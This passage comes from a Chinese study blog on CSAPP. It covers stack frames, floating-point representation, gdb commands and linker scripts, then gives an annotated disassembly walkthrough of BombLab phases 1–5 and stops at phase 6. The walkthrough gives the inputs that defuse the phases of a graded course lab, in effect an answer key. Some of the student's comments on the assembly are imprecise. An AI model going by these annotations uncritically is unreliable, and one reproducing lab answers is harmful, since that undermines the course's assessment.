%rdx subq 8(%rsp) ,%rdx imulq %rdx , %rax addq $16 , %rsp\t;此时栈帧不存在，会被后来的data覆盖掉 ret 栈帧分配到底拿来干嘛了？\n看下图：\n分配栈帧，先用来存放本方法要用的局部变量，接着是多于6个的参数从右至左依次压入栈中，然后call，注意，不要混淆局部变量和传递的参数，在被调用的方法中是不会用前一个方法栈帧中的局部变量的。\n寄存器中的局部存储空间 # 🔹 这些寄存器主要用于什么？ # 1. 存储局部变量 # （这也是一种存储局部变量的方法，比如在for循环中的index）\n如果一个函数有局部变量，但寄存器分配不足，编译器可能会把一些变量保存在被调用者保存寄存器里，避免频繁访问栈（比栈上的变量访问快）。\n2. 维持长期变量（Long-lived variables） # 如果某个变量在整个函数生命周期内都会被使用，而非临时数据，就可能放在 %rbx、%r12-%r15 这些寄存器里。\n3. 维护栈帧指针（%rbp） # 虽然现代编译器可能会省略栈帧指针（Frame Pointer Omission, FPO），但在调试模式下，%rbp 仍然用于保持当前函数的栈基址，帮助回溯调用栈。\n4. 传递跨函数调用的值 # 在一些情况下，如果一个值需要在多个函数调用之间保持不变，就可能存入被调用者保存寄存器，比如：\n递归函数中，某些参数可能需要跨多次递归调用保持不变。 在协程或上下文切换的代码里，某些寄存器可能存储特定的任务状态。 递归过程 # 到这里，理解递归过程就是简单的了，调用自己和调用任何一个过程都是类似的，每个函数都有自己的私有的栈帧。\n我们难理解的情况是栈帧里东西太复杂的情况。\n数组的分配和访问 # 1.指针访问，如果是地址，就用leaq加载有效地址，如果是取值就用mov指令即可。\n2.多维数组\n3.定长变长数组以及结构体\n关于缓冲区溢出问题 # C语言基础 # 关于位运算的技巧\n宏定义函数多行用\\分开，用do {\u0026hellip;\u0026hellip;} while(0)吃掉;（细节问题）\n内联函数：类似宏定义，调用的函数不跳转，直接展开，节约资源（根据编译器的情况而定)\nstatic inline int(...){......}\t//一般这样定义在头文件里使用 关于C语言不再赘述\n浮点数详解 # 浮点数存储形式 # （小数点浮动）进制转换（数字电路内容）\n[!NOTE]\nIEEE754典中典\n这里的尾数其实指的就是小数点之后的二进制表示：\n比如2.5 = 10.1b\n即 $$ 2.5 = 1.01*2^1 $$\n[!NOTE]\n这是一个规格化的浮点数，所谓规格化，我们默认一个浮点数是大于1的，即有一个隐含的前导1,我们只在尾数的23位中存储小数点的部分即可，但是如果指数部分为0,但是尾数不为0,这就是一个非规格化的浮点数，计算的规则已经发生了改变，此时的指数为1-bias，为了产生平滑的过渡。\n非规格化浮点数及舍入的问题 # 舍入：就近舍入，相同0优先\n指数部分越大，密度变小，精度就会变低\n浮点数的运算 # 先把指数设置相同，再相加这会导致大数吃掉小数的情况产生\n采用如下的累加算法\n比较问题：0.1 + 0.2 != 0.3（无限不循环小数相加导致的）\n[!NOTE]\n还有一个值得注意的点是转换类型时候的最近偶数舍入（银行家舍入），这有利于减少累积舍入的误差。\n课后作业 # 此时我们去做CSAPP的3个lab，并且把CSAPP2,3章的课后习题都解决一遍（我懒的写第二章了，我只写一下第三章的内容）\n1.datalab\n2.bomblab（gdb的使用，很有难度,我觉得可以先多看看书，做一下练习和课后习题，理解之后再去上手）\ngdb常用指令（来自https://arthals.ink/blog/bomb-lab作为参考的blog）\np $rax # 打印寄存器 rax 的值 p $rsp # 打印栈指针的值 p/x $rsp # 打印栈指针的值，以十六进制显示 p/d $rsp # 打印栈指针的值，以十进制显示 x/2x $rsp # 以十六进制格式查看栈指针 %rsp 指向的内存位置 M[%rsp] 开始的两个单位。 x/2d $rsp # 以十进制格式查看栈指针 %rsp 指向的内存位置 M[%rsp] 开始的两个单位。 x/2c $rsp # 以字符格式查看栈指针 %rsp 指向的内存位置 M[%rsp] 开始的两个单位。 x/s $rsp # 把栈指针指向的内存位置 M[%rsp] 当作 C 风格字符串来查看。 x/b $rsp # 检查栈指针指向的内存位置 M[%rsp] 开始的 1 字节。 x/h $rsp # 检查栈指针指向的内存位置 M[%rsp] 开始的 2 字节（半字）。 x/w $rsp # 检查栈指针指向的内存位置 M[%rsp] 开始的 4 字节（字）。 x/g $rsp # 检查栈指针指向的内存位置 M[%rsp] 开始的 8 字节（双字）。 info registers # 打印所有寄存器的值 info breakpoints # 打印所有断点的信息 delete breakpoints 1 # 删除第一个断点，可以简写为 d 1 3.attacklab（模拟攻击）\n[!NOTE]\n上述工作会花费很长时间，但是欲速则不达，如果难以下手，你可以参考CSDIY上的一些推荐博客。\n链接简单解读 # Static Linking # 可以理解是怎么把你写的多文件程序整合在一起运行。\n可重定位目标文件的分析(Relocatable File) # 单个文件汇编之后，后缀为.o的文件就是一个可重定位目标文件。\n（用以下的两个程序）\nreadelf -a main.o\t//分析elf文件内容 hexdump -C main.o\t//直接查看文件的二进制信息 符号表信息 # 弱符号和强符号 # 可执行文件 # 查看可执行文件的Program Header（可执行文件是怎么被加载执行的？）\nProgram Headers: Type Offset VirtAddr PhysAddr FileSiz MemSiz Flg Align LOAD 0x001020 0x00800020 0x00800020 0x00198 0x00198 R E 0x1000 LOAD 0x002000 0x00801000 0x00801000 0x00038 0x00050 RW 0x1000 GNU_STACK 0x000000 0x00000000 0x00000000 0x00000 0x00000 RW 0x10 Section to Segment mapping: Segment Sections... 00 .text .rodata 01 .data .bss 02 静态链接的过程 # /* Simple linker script for os user-level programs. See the GNU ld \u0026#39;info\u0026#39; manual (\u0026#34;info ld\u0026#34;) to learn the syntax. */ //一个简单的linker脚本 OUTPUT_FORMAT(\u0026#34;elf32-i386\u0026#34;, \u0026#34;elf32-i386\u0026#34;, \u0026#34;elf32-i386\u0026#34;)\t//输出格式 OUTPUT_ARCH(i386)\t//架构类型 ENTRY(main)\t//程序的入口点（main函数） SECTIONS { /* Load programs at this address: \u0026#34;.\u0026#34; means the current address */ //在这个地址对程序进行加载 . = 0x800020; //以下都是把每个目标文件中的相同的段合并到新的段 .text : { *(.text .stub .text.* .gnu.linkonce.t.*) } PROVIDE(etext = .); /* Define the \u0026#39;etext\u0026#39; symbol to this value */ .rodata : { *(.rodata .rodata.* .gnu.linkonce.r.*) } /* Adjust the address for the data segment to the next page */ //转页进行存储，以上的页就可以设置成ro的一个页 . = ALIGN(0x1000); .data : { *(.data) } //记录下来，把.bss段设置成0 PROVIDE(edata = .); .bss : { *(.bss) } PROVIDE(end = .); /DISCARD/ : { *(.eh_frame .note.GNU-stack .comment) } } 重定位信息 # ","date":"10 March 2025","externalUrl":null,"permalink":"/csapp/computerorgnization/","section":"","summary":"\u003cblockquote\u003e\n\u003cp\u003e本期封面是动漫《白箱》的主角团，如果你对于动漫制作的幕后感兴趣，这是一部不可多得的佳作。\u003c/p\u003e\u003c/blockquote\u003e\n\n\n\u003ch1 class=\"relative group\"\u003e\u003cstrong\u003eComputer Organization\u003c/strong\u003e \n    \u003cdiv id=\"computer-organization\" class=\"anchor\"\u003e\u003c/div\u003e\n    \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700\"\n            style=\"text-decoration-line: none !important;\" href=\"#computer-organization\" aria-label=\"Anchor\"\u003e#\u003c/a\u003e\n    \u003c/span\u003e        \n    \n\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e[!NOTE]\u003c/p\u003e\n\u003cp\u003e在本篇之前，我已经实现了一个非常简单的CPU（感觉都是属于数字电路的内容，当然也是计组的一部分），课程笔记以及资源都来自于B站：Cs Primer。\u003c/p\u003e","title":"ComputerOrgnization","type":"csapp"},{"content":" 本期封面是动漫《轻音少女》第一季时唯一律澪之间发生小矛盾的故事，此时，她们三个正在远远的看着mio\u0026hellip;\u0026hellip;\nCSAPP:BombLab # [!NOTE]\n本文主要参考博客：arthals.ink，如果你要学习方法，你只要看TA写的就可以了，我只看了前两层， 只是做个记录，我认为对于我来说很好的解决问题方式就是写注释(所以我这里有逐行的注释)。\ngdb指令：\np $rax # 打印寄存器 rax 的值 p $rsp # 打印栈指针的值 p/x $rsp # 打印栈指针的值，以十六进制显示 p/d $rsp # 打印栈指针的值，以十进制显示 x/2x $rsp # 以十六进制格式查看栈指针 %rsp 指向的内存位置 M[%rsp] 开始的两个单位。 x/2d $rsp # 以十进制格式查看栈指针 %rsp 指向的内存位置 M[%rsp] 开始的两个单位。 x/2c $rsp # 以字符格式查看栈指针 %rsp 指向的内存位置 M[%rsp] 开始的两个单位。 x/s $rsp # 把栈指针指向的内存位置 M[%rsp] 当作 C 风格字符串来查看。 x/b $rsp # 检查栈指针指向的内存位置 M[%rsp] 开始的 1 字节。 x/h $rsp # 检查栈指针指向的内存位置 M[%rsp] 开始的 2 字节（半字）。 x/w $rsp # 检查栈指针指向的内存位置 M[%rsp] 开始的 4 字节（字）。 x/g $rsp # 检查栈指针指向的内存位置 M[%rsp] 开始的 8 字节（双字）。 info registers # 打印所有寄存器的值 info breakpoints # 打印所有断点的信息 delete breakpoints 1 # 删除第一个断点，可以简写为 d 1 phase1: # 比较简单，就是对比一下字符串，熟悉一下。\n00000000000015ab \u0026lt;phase_1\u0026gt;: 15ab:\tf3 0f 1e fa endbr64 15af:\t48 83 ec 08 sub $0x8,%rsp 15b3:\t48 8d 35 f2 1a 00 00 lea 0x1af2(%rip),%rsi # 这很简单，你只要查看rsi里面存放了什么东西就可以 15ba:\te8 f3 05 00 00 call 1bb2 \u0026lt;strings_not_equal\u0026gt; 15bf:\t85 c0 test %eax,%eax 15c1:\t75 05 jne 15c8 \u0026lt;phase_1+0x1d\u0026gt; 15c3:\t48 83 c4 08 add $0x8,%rsp 15c7:\tc3 ret 15c8:\te8 f9 06 00 00 call 1cc6 \u0026lt;explode_bomb\u0026gt; 15cd:\teb f4 jmp 15c3 \u0026lt;phase_1+0x18\u0026gt; phase2: # 先看phase_2的代码，这是典型的循环\n00000000000015cf \u0026lt;phase_2\u0026gt;: 15cf:\tf3 0f 1e fa endbr64 # 用来防止ROP攻击 15d3:\t55 push %rbp # 两个局部变量 15d4:\t53 push %rbx 15d5:\t48 83 ec 28 sub $0x28,%rsp # 分配了40个字节 15d9:\t64 48 8b 04 25 28 00 mov %fs:0x28,%rax # 金丝雀值，用来防止恶意修改 15e0:\t00 00 15e2:\t48 89 44 24 18 mov %rax,0x18(%rsp) # 把金丝雀值保存起来，这样被修改的时候就会提醒 15e7:\t31 c0 xor %eax,%eax # ??? 15e9:\t48 89 e6 mov %rsp,%rsi # 栈指针的值赋给了rsi 15ec:\te8 2d 07 00 00 call 1d1e \u0026lt;read_six_numbers\u0026gt; # 调用一个读取6个数字的函数 15f1:\t83 3c 24 01 cmpl $0x1,(%rsp) # 第一个数字为1 15f5:\t75 0a jne 1601 \u0026lt;phase_2+0x32\u0026gt; 15f7:\t48 89 e3 mov %rsp,%rbx # rbx为当前栈顶的地址 15fa:\t48 8d 6c 24 14 lea 0x14(%rsp),%rbp # rbp存放rsp + 20bytes的地址 0 4 8 12 16 20刚好六个数字用栈传递 15ff:\teb 10 jmp 1611 \u0026lt;phase_2+0x42\u0026gt; # 无条件跳转1611 1601:\te8 c0 06 00 00 call 1cc6 \u0026lt;explode_bomb\u0026gt; 1606:\teb ef jmp 15f7 \u0026lt;phase_2+0x28\u0026gt; 1608:\t48 83 c3 04 add $0x4,%rbx # 相等的情况下考察第二个参数的情况 160c:\t48 39 eb cmp %rbp,%rbx # 循环终止条件 160f:\t74 10 je 1621 \u0026lt;phase_2+0x52\u0026gt; 1611:\t8b 03 mov (%rbx),%eax # 取第一个参数到eax 1613:\t01 c0 add %eax,%eax # eax = eax * 2 1615:\t39 43 04 cmp %eax,0x4(%rbx) # 和第二个参数作比较 1618:\t74 ee je 1608 \u0026lt;phase_2+0x39\u0026gt; # 相等继续，不相等爆炸 161a:\te8 a7 06 00 00 call 1cc6 \u0026lt;explode_bomb\u0026gt; 161f:\teb e7 jmp 1608 \u0026lt;phase_2+0x39\u0026gt; 1621:\t48 8b 44 24 18 mov 0x18(%rsp),%rax 1626:\t64 48 2b 04 25 28 00 sub %fs:0x28,%rax 162d:\t00 00 162f:\t75 07 jne 1638 \u0026lt;phase_2+0x69\u0026gt; 1631:\t48 83 c4 28 add $0x28,%rsp 1635:\t5b pop %rbx 1636:\t5d pop %rbp 1637:\tc3 ret 1638:\te8 13 fc ff ff call 1250 \u0026lt;__stack_chk_fail@plt\u0026gt; 再看它调用的读取六个数字的function\n0000000000001d1e \u0026lt;read_six_numbers\u0026gt;: 1d1e:\tf3 0f 1e fa endbr64 1d22:\t48 83 ec 08 sub $0x8,%rsp # 再分配8个字节 1d26:\t48 89 f2 mov %rsi,%rdx # 记住rsi是上一层栈顶的位置放到rdx这里 1d29:\t48 8d 4e 04 lea 0x4(%rsi),%rcx # 把这些参数用寄存器向下一个sscanf传递 1d2d:\t48 8d 46 14 lea 0x14(%rsi),%rax 1d31:\t50 push %rax 1d32:\t48 8d 46 10 lea 0x10(%rsi),%rax 1d36:\t50 push %rax 1d37:\t4c 8d 4e 0c lea 0xc(%rsi),%r9 1d3b:\t4c 8d 46 08 lea 0x8(%rsi),%r8 1d3f:\t48 8d 35 b6 15 00 00 lea 0x15b6(%rip),%rsi # 32fc \u0026lt;array.0+0x1fc\u0026gt; 这里应该是我们输入的数字 int sscanf(const char *str, const char *format, ...); 1d46:\tb8 00 00 00 00 mov $0x0,%eax # 分析一下sscanf的参数 rdi:就是我们输入的string,rsi是格式,就是\u0026#34;%d %d %d %d %d %d\u0026#34;,rdx是第一个数,rcx是第二个数,r8是第三个数,r9是第四个数,现在寄存器不够用，用栈传递参数，并且是从右向左的这就很好理解了 1d4b:\te8 b0 f5 ff ff call 1300 \u0026lt;__isoc99_sscanf@plt\u0026gt; #这里要调用sscanf函数 1d50:\t48 83 c4 10 add $0x10,%rsp 1d54:\t83 f8 05 cmp $0x5,%eax 1d57:\t7e 05 jle 1d5e \u0026lt;read_six_numbers+0x40\u0026gt; 1d59:\t48 83 c4 08 add $0x8,%rsp 1d5d:\tc3 ret 1d5e:\te8 63 ff ff ff call 1cc6 \u0026lt;explode_bomb\u0026gt; phase3: # 本层就是关于一些条件的判断(大概就是switch语句)（理解提升了，之前自己肯定没办法做出来的）：\n000000000000163d \u0026lt;phase_3\u0026gt;: # 提醒是关于switch语句,不是哥们是否有些太长了 163d:\tf3 0f 1e fa endbr64 # 我们按照线性的方法先走一遍程序 1641:\t48 83 ec 28 sub $0x28,%rsp # 分配了40个字节 1645:\t64 48 8b 04 25 28 00 mov %fs:0x28,%rax # 金丝雀值 164c:\t00 00 164e:\t48 89 44 24 18 mov %rax,0x18(%rsp) # 金丝雀值放在24个字节开始的位置 1653:\t31 c0 xor %eax,%eax # 检查 1655:\t48 8d 4c 24 0f lea 0xf(%rsp),%rcx # rcx = rsp + 15 占一个字节 第四个参数 a2 165a:\t48 8d 54 24 10 lea 0x10(%rsp),%rdx # rdx = rsp + 16 占四个字节 第三个参数 a1 165f:\t4c 8d 44 24 14 lea 0x14(%rsp),%r8 # r8 = rsp + 20 占四个字节 第五个参数 a3 1664:\t48 8d 35 5e 1a 00 00 lea 0x1a5e(%rip),%rsi # 30c9 \u0026lt;_IO_stdin_used+0xc9\u0026gt; 这里的rsi是\u0026#34;%d %c %d\u0026#34; 166b:\te8 90 fc ff ff call 1300 \u0026lt;__isoc99_sscanf@plt\u0026gt; 1670:\t83 f8 02 cmp $0x2,%eax # sscanf的返回值是读取的参数的个数,若参数小于2错 1673:\t7e 20 jle 1695 \u0026lt;phase_3+0x58\u0026gt; 1675:\t83 7c 24 10 07 cmpl $0x7,0x10(%rsp) # a1大于7就爆炸 167a:\t0f 87 0a 01 00 00 ja 178a \u0026lt;phase_3+0x14d\u0026gt; 1680:\t8b 44 24 10 mov 0x10(%rsp),%eax # rax = a1(我们先假设a1 = 6) 1684:\t48 8d 15 55 1a 00 00 lea 0x1a55(%rip),%rdx # 30e0 \u0026lt;_IO_stdin_used+0xe0\u0026gt; rdx中加载了一个-68? 168b:\t48 63 04 82 movslq (%rdx,%rax,4),%rax # rax = 4 * rax + rdx 168f:\t48 01 d0 add %rdx,%rax # rax = rax + rdx(可能是跳表位置的计算？) 1692:\t3e ff e0 notrack jmp *%rax # 其作用是 跳转到 RAX 寄存器存储的地址，并且不记录 return address 到 影子调用栈（Shadow Stack 1695:\te8 2c 06 00 00 call 1cc6 \u0026lt;explode_bomb\u0026gt; 169a:\teb d9 jmp 1675 \u0026lt;phase_3+0x38\u0026gt; 169c:\tb8 77 00 00 00 mov $0x77,%eax 16a1:\t81 7c 24 14 a8 01 00 cmpl $0x1a8,0x14(%rsp) 16a8:\t00 16a9:\t0f 84 e5 00 00 00 je 1794 \u0026lt;phase_3+0x157\u0026gt; 16af:\te8 12 06 00 00 call 1cc6 \u0026lt;explode_bomb\u0026gt; 16b4:\tb8 77 00 00 00 mov $0x77,%eax 16b9:\te9 d6 00 00 00 jmp 1794 \u0026lt;phase_3+0x157\u0026gt; 16be:\tb8 70 00 00 00 mov $0x70,%eax 16c3:\t81 7c 24 14 bc 00 00 cmpl $0xbc,0x14(%rsp) 16ca:\t00 16cb:\t0f 84 c3 00 00 00 je 1794 \u0026lt;phase_3+0x157\u0026gt; 16d1:\te8 f0 05 00 00 call 1cc6 \u0026lt;explode_bomb\u0026gt; 16d6:\tb8 70 00 00 00 mov $0x70,%eax 16db:\te9 b4 00 00 00 jmp 1794 \u0026lt;phase_3+0x157\u0026gt; 16e0:\tb8 78 00 00 00 mov $0x78,%eax 16e5:\t81 7c 24 14 40 03 00 cmpl $0x340,0x14(%rsp) 16ec:\t00 16ed:\t0f 84 a1 00 00 00 je 1794 \u0026lt;phase_3+0x157\u0026gt; 16f3:\te8 ce 05 00 00 call 1cc6 \u0026lt;explode_bomb\u0026gt; 16f8:\tb8 78 00 00 00 mov $0x78,%eax 16fd:\te9 92 00 00 00 jmp 1794 \u0026lt;phase_3+0x157\u0026gt; 1702:\tb8 6e 00 00 00 mov $0x6e,%eax 1707:\t83 7c 24 14 39 cmpl $0x39,0x14(%rsp) 170c:\t0f 84 82 00 00 00 je 1794 \u0026lt;phase_3+0x157\u0026gt; 1712:\te8 af 05 00 00 call 1cc6 \u0026lt;explode_bomb\u0026gt; 1717:\tb8 6e 00 00 00 mov $0x6e,%eax 171c:\teb 76 jmp 1794 \u0026lt;phase_3+0x157\u0026gt; 171e:\tb8 74 00 00 00 mov $0x74,%eax 1723:\t81 7c 24 14 c4 03 00 cmpl $0x3c4,0x14(%rsp) 172a:\t00 172b:\t74 67 je 1794 \u0026lt;phase_3+0x157\u0026gt; 172d:\te8 94 05 00 00 call 1cc6 \u0026lt;explode_bomb\u0026gt; 1732:\tb8 74 00 00 00 mov $0x74,%eax 1737:\teb 5b jmp 1794 \u0026lt;phase_3+0x157\u0026gt; 1739:\tb8 67 00 00 00 mov $0x67,%eax 173e:\t81 7c 24 14 95 03 00 cmpl $0x395,0x14(%rsp) 1745:\t00 1746:\t74 4c je 1794 \u0026lt;phase_3+0x157\u0026gt; 1748:\te8 79 05 00 00 call 1cc6 \u0026lt;explode_bomb\u0026gt; 174d:\tb8 67 00 00 00 mov $0x67,%eax 1752:\teb 40 jmp 1794 \u0026lt;phase_3+0x157\u0026gt; 1754:\tb8 71 00 00 00 mov $0x71,%eax # a1小于7会跳转到这里 eax = 71,这里已经重新赋值了 1759:\t81 7c 24 14 f2 01 00 cmpl $0x1f2,0x14(%rsp) # 看第三个参数的值,不等于498就爆炸 1760:\t00 1761:\t74 31 je 1794 \u0026lt;phase_3+0x157\u0026gt; 1763:\te8 5e 05 00 00 call 1cc6 \u0026lt;explode_bomb\u0026gt; 1768:\tb8 71 00 00 00 mov $0x71,%eax 176d:\teb 25 jmp 1794 \u0026lt;phase_3+0x157\u0026gt; 176f:\tb8 6e 00 00 00 mov $0x6e,%eax 1774:\t81 7c 24 14 83 03 00 cmpl $0x383,0x14(%rsp) 177b:\t00 177c:\t74 16 je 1794 \u0026lt;phase_3+0x157\u0026gt; 177e:\te8 43 05 00 00 call 1cc6 \u0026lt;explode_bomb\u0026gt; 1783:\tb8 6e 00 00 00 mov $0x6e,%eax 1788:\teb 0a jmp 1794 \u0026lt;phase_3+0x157\u0026gt; 178a:\te8 37 05 00 00 call 1cc6 \u0026lt;explode_bomb\u0026gt; 178f:\tb8 6e 00 00 00 mov $0x6e,%eax 1794:\t38 44 24 0f cmp %al,0xf(%rsp) # 等于498的情况下来到这里,看输入的字符和al的值是否相等，查ASCII这里应该是G 1798:\t75 15 jne 17af \u0026lt;phase_3+0x172\u0026gt; # 不相等爆炸 179a:\t48 8b 44 24 18 mov 0x18(%rsp),%rax # 第二个是q，OK结束，完全不知道具体的switch但是能做 179f:\t64 48 2b 04 25 28 00 sub %fs:0x28,%rax 17a6:\t00 00 17a8:\t75 0c jne 17b6 \u0026lt;phase_3+0x179\u0026gt; 17aa:\t48 83 c4 28 add $0x28,%rsp 17ae:\tc3 ret 17af:\te8 12 05 00 00 call 1cc6 \u0026lt;explode_bomb\u0026gt; 17b4:\teb e4 jmp 179a \u0026lt;phase_3+0x15d\u0026gt; 17b6:\te8 95 fa ff ff call 1250 \u0026lt;__stack_chk_fail@plt\u0026gt; phase4: # 关于递归函数？\n这是phase4中调用的方法：\n00000000000017bb \u0026lt;func4\u0026gt;: # 开始的参数 edi:a1(x1) esi:0(x2) edx:14(x3) 设返回值为x 17bb:\tf3 0f 1e fa endbr64 # 这应该是一个递归函数 17bf:\t53 push %rbx # 临时变量 (temp) 17c0:\t89 d0 mov %edx,%eax # x = x3 17c2:\t29 f0 sub %esi,%eax # x -= x2 17c4:\t89 c3 mov %eax,%ebx # temp = x 17c6:\tc1 eb 1f shr $0x1f,%ebx # 这里相当于是取了temp的符号 17c9:\t01 c3 add %eax,%ebx # temp += x 17cb:\td1 fb sar %ebx # temp /= 2(这里就是默认省略了1,愚蠢) 17cd:\t01 f3 add %esi,%ebx # temp += x2 17cf:\t39 fb cmp %edi,%ebx # 比较和x1相不相等 17d1:\t7f 06 jg 17d9 \u0026lt;func4+0x1e\u0026gt; # 如果大于\u0026gt; 17d3:\t7c 10 jl 17e5 \u0026lt;func4+0x2a\u0026gt; # 如果小于\u0026lt; 17d5:\t89 d8 mov %ebx,%eax # x = temp 17d7:\t5b pop %rbx 17d8:\tc3 ret 17d9:\t8d 53 ff lea -0x1(%rbx),%edx # 大于x1的情况 x3 = temp - 1 17dc:\te8 da ff ff ff call 17bb \u0026lt;func4\u0026gt; # 递归调用 17e1:\t01 c3 add %eax,%ebx # temp += x 17e3:\teb f0 jmp 17d5 \u0026lt;func4+0x1a\u0026gt; # 返回 17e5:\t8d 73 01 lea 0x1(%rbx),%esi # 小于的情况 x1 = temp + 1 17e8:\te8 ce ff ff ff call 17bb \u0026lt;func4\u0026gt; # 递归调用 17ed:\t01 c3 add %eax,%ebx # temp += x 17ef:\teb e4 jmp 17d5 \u0026lt;func4+0x1a\u0026gt; # 返回 00000000000017f1 \u0026lt;phase_4\u0026gt;: 17f1:\tf3 0f 1e fa endbr64 17f5:\t48 83 ec 18 sub $0x18,%rsp # 分配24个字节 17f9:\t64 48 8b 04 25 28 00 mov %fs:0x28,%rax # 金丝雀值 1800:\t00 00 1802:\t48 89 44 24 08 mov %rax,0x8(%rsp) # 把金丝雀值放到了stack上面 1807:\t31 c0 xor %eax,%eax 1809:\t48 8d 4c 24 04 lea 0x4(%rsp),%rcx # 栈上参数传递 第四个参数 4字节 a2 180e:\t48 89 e2 mov %rsp,%rdx # 第三个参数 4字节 a1 1811:\t48 8d 35 f0 1a 00 00 lea 0x1af0(%rip),%rsi # 参数格式：\u0026#34;%d %d\u0026#34; 1818:\te8 e3 fa ff ff call 1300 \u0026lt;__isoc99_sscanf@plt\u0026gt; 181d:\t83 f8 02 cmp $0x2,%eax # 是否读取正确 1820:\t75 06 jne 1828 \u0026lt;phase_4+0x37\u0026gt; # 不正确爆炸 1822:\t83 3c 24 0e cmpl $0xe,(%rsp) # a1 \u0026lt;= 14不然爆炸 1826:\t76 05 jbe 182d \u0026lt;phase_4+0x3c\u0026gt; 1828:\te8 99 04 00 00 call 1cc6 \u0026lt;explode_bomb\u0026gt; # a1 \u0026lt;= 14跳到这里 这里大概是为调用f4做准备 182d:\tba 0e 00 00 00 mov $0xe,%edx # 第三个参数是14 1832:\tbe 00 00 00 00 mov $0x0,%esi # 第二个参数是0 1837:\t8b 3c 24 mov (%rsp),%edi # 第一个参数是a1 183a:\te8 7c ff ff ff call 17bb \u0026lt;func4\u0026gt; # 调用了f4,那就是说我们根据f4的逻辑来设置a1的输入 183f:\t83 f8 12 cmp $0x12,%eax # 将返回值和18作比较 1842:\t75 07 jne 184b \u0026lt;phase_4+0x5a\u0026gt; # 不相同就爆炸 1844:\t83 7c 24 04 12 cmpl $0x12,0x4(%rsp) # 把a2和18作比较 1849:\t74 05 je 1850 \u0026lt;phase_4+0x5f\u0026gt; # 不相同爆炸，相同结束 184b:\te8 76 04 00 00 call 1cc6 \u0026lt;explode_bomb\u0026gt; 1850:\t48 8b 44 24 08 mov 0x8(%rsp),%rax 1855:\t64 48 2b 04 25 28 00 sub %fs:0x28,%rax 185c:\t00 00 185e:\t75 05 jne 1865 \u0026lt;phase_4+0x74\u0026gt; 1860:\t48 83 c4 18 add $0x18,%rsp 1864:\tc3 ret 1865:\te8 e6 f9 ff ff call 1250 \u0026lt;__stack_chk_fail@plt\u0026gt; 我对于fun4做了逆向：\n#include\u0026lt;stdio.h\u0026gt; //手动逆向代码fun4 int fun4(int num1, int num2, int num3){ int x = num3 - num2; int temp = x; if(temp \u0026lt; 0){ ++temp; } temp /= 2; temp += num2; if(temp \u0026gt; num1){ //要注意调用完成之后获取的rax的使用（因为这里只调用但没有获取值浪费了很长时间） return fun4(num1, num2, temp - 1) + temp; }else if(temp \u0026lt; num1){ return fun4(num1, temp + 1, num3) + temp; }else{ return temp; } } //就是给一个输入，使得返回值为0x12 int main(){ int num1; //scanf(\u0026#34;%d\u0026#34;, \u0026amp;num1); //当输入11时，答案为18,也就是answer int value = fun4(11, 0, 0xe); printf(\u0026#34;%d\\n\u0026#34;, value); } phase5: # hint：我的输入和array之间的转换关系,也不是很难\nphase5:\n000000000000186a \u0026lt;phase_5\u0026gt;: 186a:\tf3 0f 1e fa endbr64 186e:\t53 push %rbx # 一个局部变量 186f:\t48 83 ec 10 sub $0x10,%rsp # 开了16字节空间 1873:\t48 89 fb mov %rdi,%rbx # 局部变量存放rdi,rdi就是字符串的首地址 1876:\t64 48 8b 04 25 28 00 mov %fs:0x28,%rax # 金丝雀值 187d:\t00 00 187f:\t48 89 44 24 08 mov %rax,0x8(%rsp) # 放在栈上，也就是说有8字节的可用空间 1884:\t31 c0 xor %eax,%eax # 校验 1886:\te8 06 03 00 00 call 1b91 \u0026lt;string_length\u0026gt; # 调用string_length,这里应该是rdi作为参数读入了一个string 188b:\t83 f8 06 cmp $0x6,%eax # 返回值和6比较，不相等爆炸，输入的字符串的长度要是6才可以 188e:\t75 55 jne 18e5 \u0026lt;phase_5+0x7b\u0026gt; 1890:\tb8 00 00 00 00 mov $0x0,%eax # eax = 0？下面大概是为strings_not_equal做准备，不相等爆炸 1895:\t48 8d 0d 64 18 00 00 lea 0x1864(%rip),%rcx # maduiersnfotvbylWow! You\u0026#39;ve defused the secret stage! 189c:\t0f b6 14 03 movzbl (%rbx,%rax,1),%edx # 就是我输入数字,从上面这个stirng中找值，构造一个rdi 18a0:\t83 e2 0f and $0xf,%edx 18a3:\t0f b6 14 11 movzbl (%rcx,%rdx,1),%edx 18a7:\t88 54 04 01 mov %dl,0x1(%rsp,%rax,1) 18ab:\t48 83 c0 01 add $0x1,%rax 18af:\t48 83 f8 06 cmp $0x6,%rax # rax就是一个index作为循环控制量 18b3:\t75 e7 jne 189c \u0026lt;phase_5+0x32\u0026gt; 18b5:\tc6 44 24 07 00 movb $0x0,0x7(%rsp) # 最后为我们构造的字符串添加了一个结束符号 18ba:\t48 8d 7c 24 01 lea 0x1(%rsp),%rdi 18bf:\t48 8d 35 0c 18 00 00 lea 0x180c(%rip),%rsi # *rsi = \u0026#34;bruins\u0026#34; 通过上面的操作，*rdi要等于\u0026#34;bruins\u0026#34;怎么操作？ 18c6:\te8 e7 02 00 00 call 1bb2 \u0026lt;strings_not_equal\u0026gt; # 意思就是两个字符串不相同就爆炸 18cb:\t85 c0 test %eax,%eax 18cd:\t75 1d jne 18ec \u0026lt;phase_5+0x82\u0026gt; 18cf:\t48 8b 44 24 08 mov 0x8(%rsp),%rax 18d4:\t64 48 2b 04 25 28 00 sub %fs:0x28,%rax 18db:\t00 00 18dd:\t75 14 jne 18f3 \u0026lt;phase_5+0x89\u0026gt; 18df:\t48 83 c4 10 add $0x10,%rsp 18e3:\t5b pop %rbx 18e4:\tc3 ret 18e5:\te8 dc 03 00 00 call 1cc6 \u0026lt;explode_bomb\u0026gt; 18ea:\teb a4 jmp 1890 \u0026lt;phase_5+0x26\u0026gt; 18ec:\te8 d5 03 00 00 call 1cc6 \u0026lt;explode_bomb\u0026gt; 18f1:\teb dc jmp 18cf \u0026lt;phase_5+0x65\u0026gt; 18f3:\te8 58 f9 ff ff call 1250 \u0026lt;__stack_chk_fail@plt\u0026gt; 我们不必细究它调用的两个方法的具体实现了，就和函数名字一样。我输入的string是\u0026quot;M63487\u0026quot;,因为实际上会和0xf作与运算，所以每个字符都是可选的。\nphase6: # [!CAUTION]\n应该是最难的一层了，hint：链表，那就要用到结构体了吧。（做完：其实还好，只要你理解它在干什么。）\n00000000000018f8 \u0026lt;phase_6\u0026gt;: 18f8:\tf3 0f 1e fa endbr64 # 关于链表操作,最逆天的一层，孩子们 18fc:\t41 57 push %r15 